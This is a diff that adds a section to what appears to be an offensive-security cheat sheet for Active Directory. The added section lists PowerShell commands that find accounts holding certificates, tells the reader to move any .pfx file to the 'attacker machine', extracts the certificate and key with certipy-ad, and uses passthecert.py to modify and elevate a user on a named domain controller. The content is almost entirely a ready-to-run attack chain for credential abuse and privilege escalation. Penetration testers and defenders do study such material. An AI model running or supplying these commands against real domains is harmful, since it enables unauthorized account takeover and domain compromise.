@@ -298,3 +298,17 @@ powershell -ep bypass .\PowerUp.ps1
 ```
 
 
+search for pfx certificate :
+```bash
+Get-ADUser -Filter * -Properties userCertificate | Where-Object { $_.userCertificate -ne $null }
+
+Get-ADComputer -Filter * -Properties userCertificate | Where-Object { $_.userCertificate -ne $null }
+
+#if find any .pfx flie tranfer to attacker machine.
+certipy-ad cert -pfx administrator.pfx -nokey -out "user.crt"
+certipy-ad cert -pfx administrator.pfx -nocert -out "user.key"
+
+#pass the extracted cert to dc for modify user object.
+./passthecert.py -action modify_user -crt user.crt -key user.key -domain "ignite.local" -dc-ip 192.168.1.48 -target aarti -elevate
+
+```
